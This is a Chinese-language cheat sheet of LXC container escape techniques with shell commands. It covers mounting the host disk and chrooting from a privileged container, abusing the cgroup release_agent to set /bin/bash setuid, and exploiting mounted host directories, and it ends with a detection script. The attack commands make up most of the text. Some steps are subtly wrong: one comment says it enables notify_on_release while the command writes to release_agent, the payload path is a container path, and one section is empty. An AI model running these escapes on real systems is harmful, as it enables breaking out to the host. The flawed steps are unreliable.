# lxc逃逸
LXC 容器逃逸技术概览​
​1. 特权模式容器逃逸 (Privileged Mode)
检测

```
# 检查 LXC 配置文件
cat /var/lib/lxc/*/config 2>/dev/null

# 检查是否特权容器
grep -q "lxc.idmap" /var/lib/lxc/*/config 2>/dev/null
# 如果存在 lxc.idmap 映射，通常为非特权容器
```
逃逸方法:

```
# 方法一：直接挂载宿主机根文件系统
mkdir /tmp/host_root
mount /dev/sda1 /tmp/host_root  # 需要先 fdisk -l 查看磁盘设备
# 然后就可以完全访问宿主机文件系统：
chroot /tmp/host_root bash

# 方法二：通过设备文件访问
# 如果可以访问 /dev/sda1、/dev/dm-0 等宿主机磁盘设备，可以直接挂载
```
2. 滥用 CGroup 通知功能
检测
```
# 检查 cgroup 配置
cat /proc/1/cgroup
# 查找包含 "notify_on_release" 的 cgroup
find /sys/fs/cgroup/ -name "notify_on_release" -exec cat {} \; 2>/dev/null
```
逃逸方法:

```
# 1. 启用 notify_on_release
echo 1 > /sys/fs/cgroup/memory/release_agent

# 2. 设置 release_agent 路径（指向宿主机上的脚本）
echo '/tmp/payload.sh' > /sys/fs/cgroup/memory/release_agent

# 3. 创建有效载荷脚本
cat > /tmp/payload.sh << 'EOF'
#!/bin/sh
chmod 4755 /bin/bash  # 或者任何你想执行的命令
EOF
chmod +x /tmp/payload.sh

# 4. 触发释放过程
echo $$ > /sys/fs/cgroup/memory/cgroup.procs
```
3. 内核漏洞利用
4. 挂载点逃逸 
检测:

```
# 检查当前挂载点
mount | grep -E '(overlay|ext4|xfs|bind)'

# 检查是否有敏感目录被挂载
ls -la /host  # 某些配置可能挂载宿主机目录到 /host
```

​逃逸方法:

```
# 如果发现宿主机目录被挂载到容器内
cd /host  # 可能直接访问宿主机文件系统

# 尝试挂载新设备
fdisk -l  # 查看可用设备
mkdir /mnt/escape
mount /dev/sda1 /mnt/escape
```
5. LXCFS 逃逸
LXCFS 是 LXC 的文件系统视图虚拟化工具，可能存在配置漏洞。
检测方法：

```
# 检查 LXCFS 相关挂载
mount | grep lxcfs

# 检查相关进程
ps aux | grep lxcfs
```


6. 网络逃逸 (Network Escape)​
检测:

```
# 检查网络配置
ip addr show
ip route show

# 检查是否与宿主机共享网络命名空间
# 如果容器内有 docker0、eth0 等宿主机网络设备，可能是共享网络
```

----------------------------------   


自动检测脚本

```
#!/bin/bash

echo "[+] LXC Container Escape Detection Script"

# 1. 检查特权模式
echo -n "Privileged mode: "
if [ $(id -u) -eq 0 ] && [ -x /sbin/capsh ]; then
    capsh --print | grep -q 'Bounding set = cap' && echo "YES" || echo "NO"
else
    echo "UNKNOWN"
fi

# 2. 检查设备访问
echo -n "Host device access: "
ls /dev/sda* 2>/dev/null && echo "YES" || echo "NO"

# 3. 检查挂载点
echo "Mount points:"
mount | grep -E '(overlay|bind|ext4|xfs|nfs)'

# 4. 检查 cgroup
echo "CGroup info:"
cat /proc/1/cgroup

# 5. 检查内核版本
echo "Kernel version: $(uname -r)"

# 6. 检查 LXCFS
echo -n "LXCFS mounted: "
mount | grep -q lxcfs && echo "YES" || echo "NO"

# 7. 检查网络模式
echo "Network interfaces:"
ip addr show
```



